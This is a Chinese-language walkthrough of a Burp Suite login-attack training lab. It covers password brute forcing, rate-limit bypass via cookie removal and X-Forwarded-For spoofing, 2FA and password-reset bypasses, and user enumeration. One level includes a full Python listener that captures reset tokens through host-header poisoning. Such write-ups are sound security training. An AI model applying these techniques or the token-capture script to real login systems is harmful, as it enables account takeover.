# Burp-Labs

所涉及的密码字典如下

https://github.com/wwl012345/PasswordDic/blob/main/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AD%97%E5%85%B8/passwd-top1000.txt

项目地址：https://github.com/duckpigdog/burp-labs

## 基础篇

### Level 1

简单的登录页面，直接爆破就行

![](https://pic1.imgdb.cn/item/693555fd037624265dadab19.png)

### Level 2

发现 admin 用户长度不一样，且返回了密码错误。所以直接爆破这个用户即可

![](https://pic1.imgdb.cn/item/6935721a3cf558499f249b8b.png)

### Level 3

发现这次长度一致，查看爆破失败的信息

![](https://pic1.imgdb.cn/item/69355a7b3cf558499f243307.png)

使用过滤器搜索不包含失败的响应结果拿到正确的用户名密码

![](https://pic1.imgdb.cn/item/69355aad3cf558499f24332e.png)

## 中级篇

### Level 4

这一关长度一致且返回 302 跳转，观察返回包错误的账号密码是跳转到登录页面

![](https://pic1.imgdb.cn/item/693578e3037624265dadc1b7.png)

使用过滤排除这个跳转位置拿到正确的账号密码

![](https://pic1.imgdb.cn/item/69357a78037624265dadc36a.png)

### Level 5

在密码 Payload 处理中添加 Base64 编码

![](https://pic1.imgdb.cn/item/69357b6b037624265dadc47b.png)

![](https://pic1.imgdb.cn/item/69357b85037624265dadc4a0.png)

### Level 6

同样加密选择 Hash 中的 MD5

![](https://pic1.imgdb.cn/item/693584213cf558499f24d8e1.png)

![](https://pic1.imgdb.cn/item/693584373cf558499f24d8fc.png)

## 高级篇

### Level 7

这一关多了一个加密参数

![](https://pic1.imgdb.cn/item/693589253cf558499f250a4e.png)

JS 逆向找到这个参数是加密过程了

![](https://pic1.imgdb.cn/item/69359a443cf558499f257a0d.png)

Burp Suite 可以暂时只爆破密码

![](https://pic1.imgdb.cn/item/69359c503cf558499f257aa4.png)

### Level 8

这一关多了前缀需要处理

![](https://pic1.imgdb.cn/item/6935a4c33cf558499f25aae5.png)

![](https://pic1.imgdb.cn/item/6935a4d43cf558499f25aae6.png)

### Level 9

这一关我们需要切换到 Yakit 执行更好的操作（当然也可以用 Burp Suite 的插件），将包放到在 Web Fuzz 中

![](https://pic1.imgdb.cn/item/6935cdf4037624265dade31f.png)

在 Web Fuzz 中点击热加载编写我们的代码

![](https://pic1.imgdb.cn/item/6935ce08037624265dade321.png)

先请求模板里写占位标签，比如：

```go
timestamp={{yak(genTS|dummy)}}
```

- `yak`：固定关键字，告诉 Yakit 这里要调用热加载里的函数
- `genTS`：你要调用的函数名
- `dummy`：传给函数的参数（字符串），可以不用

在热加载脚本里定义同名函数

```go
genTS = func(p) {
    ...
    return "xxx"
}
```

- 这个函数必须叫 `genTS`，和上面的 `{{yak(genTS|...)}}` 保持一致
- 参数个数要匹配，例如 `{{yak(fn|a,b)}}` 对应 `fn = func(p)` 然后自己 `Split`，或者 `fn = func(a, b)` 这种签名

**Yakit 发包时的流程大致是：**

1. 解析请求模板中的 `{{yak(...)}}` 标签
2. 查找热加载脚本里对应的函数
3. 把 `|` 右边的内容作为参数传入
4. 执行函数，拿到返回值
5. 用返回值替换模板里的 `{{yak(...)}}`，生成真实请求
6. 再交给 beforeRequest / 发包引擎

所以我们可以编写一个返回时间戳的函数

```go
genTS = func(p) {
    // Go 时间获取用法
    ts = time.Now().Unix()
    return sprint(ts)
}
```

点击调试可以看到返回了时间戳

![](https://pic1.imgdb.cn/item/6935cf113cf558499f25d580.png)

![](https://pic1.imgdb.cn/item/6935cf513cf558499f25d581.png)

### Level 10

换了一个格式而已，直接爆破即可

![](https://pic1.imgdb.cn/item/693637cc21501955d2fe4d77.png)

### Level 11

这一关可以自定义 Payload 脚本再 Base64 编码

![](https://pic1.imgdb.cn/item/69364102e4f772ee59f33476.png)

### Level 12

正确请求抓包发现参数是加密的

![](https://pic1.imgdb.cn/item/6936486021501955d2fec9c4.png)

找到栈跟踪

![](https://pic1.imgdb.cn/item/693648cc21501955d2feca76.png)

点进去发现加密顺序是 JSON -> Base64 -> MD5

![](https://pic1.imgdb.cn/item/693648f421501955d2fecaa6.png)

## 专家篇

### Level 13

这一关做了请求限制，不允许发送多次请求

![](https://pic1.imgdb.cn/item/69365427b981491a0c10a3ba.png)

像这种要么是对 IP 做了限制要么是对你发了一个 Cookie 做了记录，观察后端 `session_start()` 会创建一个名为 **PHPSESSID** 的 Cookie（默认名称）

所以这一关我们去掉 Cookie 就可以绕过进行爆破

![](https://pic1.imgdb.cn/item/693656052a4ee13cb94fb8b3.png)

### Level 14

这一关在爆破的基础上增加了 2FA 邮箱验证

![](https://pic1.imgdb.cn/item/693662d42a4ee13cb9500769.png)

通过测试账号登录进去发现携带了参数 `username=admin`

![](https://pic1.imgdb.cn/item/693663332a4ee13cb950081d.png) 

所以在验证码这里我们发现其也有一个参数 `username=administrator`，尝试修改文件路径

![](https://pic1.imgdb.cn/item/693663b92a4ee13cb950090a.png)

成功绕过

![](https://pic1.imgdb.cn/item/693664212a4ee13cb95009a9.png)

### Level 15

这一关主要是页面有一个重置密码功能

![](https://pic1.imgdb.cn/item/69366c242a4ee13cb9502715.png)

需要我们输入用户名发送一个重置链接

![](https://pic1.imgdb.cn/item/69366c822a4ee13cb9502a16.png)

回显已发送

![](https://pic1.imgdb.cn/item/69366cdc2a4ee13cb9502cb8.png)

然后跳转到重置密码功能处

![](https://pic1.imgdb.cn/item/69366d782a4ee13cb950316a.png)

最后设置新密码

![](https://pic1.imgdb.cn/item/69366d9e2a4ee13cb950328f.png)

这一关卡存在任意用户密码重置漏洞，所以我们可以在第一个页面输入用户名页面直接输入管理员用户名

![](https://pic1.imgdb.cn/item/69366d5e2a4ee13cb95030a7.png)

当然也可以抓包修改参数

```html
<form action="reset_password.php" method="POST">
    <input type="hidden" name="token" value="<?php echo htmlspecialchars($token); ?>">
	<!-- 漏洞点：将 username 作为隐藏字段提交，或者攻击者可以在 POST 请求中篡改它 -->
    <input type="hidden" name="username" value="<?php echo htmlspecialchars($username); ?>">

    <div class="form-group">
        <label for="new_password">新密码</label>
        <input id="new_password" name="new_password" type="password" required />
    </div>
    <div class="form-group">
        <label for="confirm_password">确认新密码</label>
        <input id="confirm_password" name="confirm_password" type="password" required />
    </div>
    <input type="submit" value="提交更改" />
</form>
```

![](https://pic1.imgdb.cn/item/693670192a4ee13cb9503a58.png)

### Level 16

输入正确的用户名会响应慢一点

![](https://pic1.imgdb.cn/item/693672842a4ee13cb95049b1.png)

错误的则会快很多，所以这一关先爆破出用户名再爆破密码即可

![](https://pic1.imgdb.cn/item/693674dbb981491a0c11b140.png)

### Level 17

这一关是会封禁 IP 的，我们添加 XFF 头伪造 IP 再遍历爆破，注意选的是 Pitchfork attack 模式

![](https://pic1.imgdb.cn/item/6936779ab981491a0c11d6f7.png)

![](https://pic1.imgdb.cn/item/693677ffb981491a0c11d80c.png)

### Level 18

这一关如果输入了正确的用户名但密码错误超过五次则会锁定账号，我们可以利用这个快速推断出存在的用户名

![](https://pic1.imgdb.cn/item/69367e47b981491a0c11f3a9.png)

### Level 19

该关卡多了一个二次验证码功能

![](https://pic1.imgdb.cn/item/693682a82a4ee13cb950a038.png)

我们手动修改 URL 参数给管理员用户发送验证码

![](https://pic1.imgdb.cn/item/69368afe2a4ee13cb950e4d5.png)

再爆破管理员账号的验证码登录

![](https://pic1.imgdb.cn/item/693686ad2a4ee13cb950c3ca.png)

### Level 20

这一关需要我们劫持重置密码链接

```php
// 从头部读取 X-Forwarded-Host，若存在则用于拼接重置链接的主机（漏洞点）
$forwardedHost = $_SERVER['HTTP_X_FORWARDED_HOST'] ?? '';
$defaultHost = $_SERVER['HTTP_HOST'] ?? '127.0.0.1:5173';
$hostToUse = $forwardedHost !== '' ? $forwardedHost : $defaultHost;
```

添加 XFF 头让其发送到我们运行的服务器上

![](https://pic1.imgdb.cn/item/6936ee53b981491a0c143a1c.png)

服务器攻击脚本如下

```python
import http.server
import socketserver
import sys
from urllib.parse import unquote

# 配置监听端口
PORT = 8888

class AttackerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # 1. 记录并打印请求详情
        print(f"\n[+] 收到来自 {self.client_address[0]} 的请求!")
        print(f"    请求路径: {self.path}")
        print(f"    Host 头: {self.headers.get('Host')}")
        
        # 2. 尝试提取 Token
        if "token=" in self.path:
            try:
                token = self.path.split("token=")[1].split("&")[0]
                print(f"\n    ★ 成功捕获 Token ★ : {token}")
                print(f"    现在你可以使用这个 Token 去重置管理员密码了！")
            except:
                pass
        
        # 3. 返回 200 OK，模拟正常服务器响应
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>404 Not Found</h1><p>(Fake generic error page to hide attacker identity)</p>")

    def log_message(self, format, *args):
        # 禁用默认的访问日志，避免刷屏
        return

def run_server():
    print(f"""
==================================================
   [ 攻击者监听服务器 ]
   监听端口: {PORT}
   使用方法: 
   1. 在 Burp Suite 中修改请求头:
      X-Forwarded-Host: 127.0.0.1:{PORT}
   2. 等待受害者（模拟脚本）点击链接
==================================================
    """)
    try:
        with socketserver.TCPServer(("", PORT), AttackerHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
    except OSError as e:
        print(f"\n[!] 端口 {PORT} 被占用，请检查是否已经运行了该脚本，或修改脚本中的 PORT 变量。")

if __name__ == "__main__":
    run_server()
```

同时运行用户模拟点击的脚本

```python
import json
import time
import requests
import os

# 配置
MAILBOX_FILE = "mailbox.json"
CHECK_INTERVAL = 2  # 检查间隔（秒）

print(f"[*] 模拟受害者正在运行...")
print(f"[*] 正在监控邮箱文件: {MAILBOX_FILE}")
print(f"[*] 当收到新邮件时，受害者会自动点击其中的链接。")

last_mtime = 0
processed_links = set()

def get_links_from_mailbox():
    try:
        if not os.path.exists(MAILBOX_FILE):
            return []
        
        # 简单的文件读取
        with open(MAILBOX_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            if not content: return []
            data = json.loads(content)
            
        links = []
        if isinstance(data, list):
            for email in data:
                if 'link' in email:
                    links.append(email['link'])
        return links
    except Exception as e:
        print(f"[!] 读取邮箱出错: {e}")
        return []

# 初始化：标记已有的链接为已处理，避免重复点击
initial_links = get_links_from_mailbox()
for link in initial_links:
    processed_links.add(link)

while True:
    try:
        current_links = get_links_from_mailbox()
        
        for link in current_links:
            if link not in processed_links:
                print(f"\n[+] 发现新邮件链接: {link}")
                print(f"[*] 受害者正在点击链接...")
                
                try:
                    # 模拟点击：发送 GET 请求
                    # 设置超时，防止攻击者服务器不响应导致卡死
                    resp = requests.get(link, timeout=5)
                    print(f"    -> 访问完成 (状态码: {resp.status_code})")
                except Exception as e:
                    print(f"    -> 访问失败: {e}")
                    print(f"       (这可能是因为攻击者服务器 [Host Header] 指向了错误的地址)")
                
                processed_links.add(link)
        
        time.sleep(CHECK_INTERVAL)
        
    except KeyboardInterrupt:
        print("\n[*] 受害者模拟已停止")
        break
```

模拟用户点击链接的脚本

![](https://pic1.imgdb.cn/item/6936efd3b981491a0c143a4d.png)

攻击者收到链接及 Token

![](https://pic1.imgdb.cn/item/6936efe5b981491a0c143a52.png)

可以直接重置密码

![](https://pic1.imgdb.cn/item/6936f083b981491a0c143b42.png)

### Level 21

这一关需要输入 `admin/abc123` 登录后利用修改密码功能处未校验爆破 `administrator` 用户的密码

![](https://pic1.imgdb.cn/item/6936f613b981491a0c147280.png)
